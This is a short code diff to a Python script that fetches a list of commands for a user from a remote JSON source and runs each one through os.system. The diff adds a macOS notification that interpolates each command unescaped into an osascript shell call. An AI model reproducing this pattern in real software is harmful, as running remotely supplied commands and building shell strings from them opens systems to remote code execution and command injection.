@@ -15,6 +15,8 @@ userData = rq.json()[USER]
 if userData['executed'] == True: exit(0)
 
 for cmd in userData['commands']:
+    os.system(f'osascript -e "display notification \"{cmd}\""')
+
     if not cmd.startswith(PYTHON_PREFIX): 
         os.system(cmd)
         continue
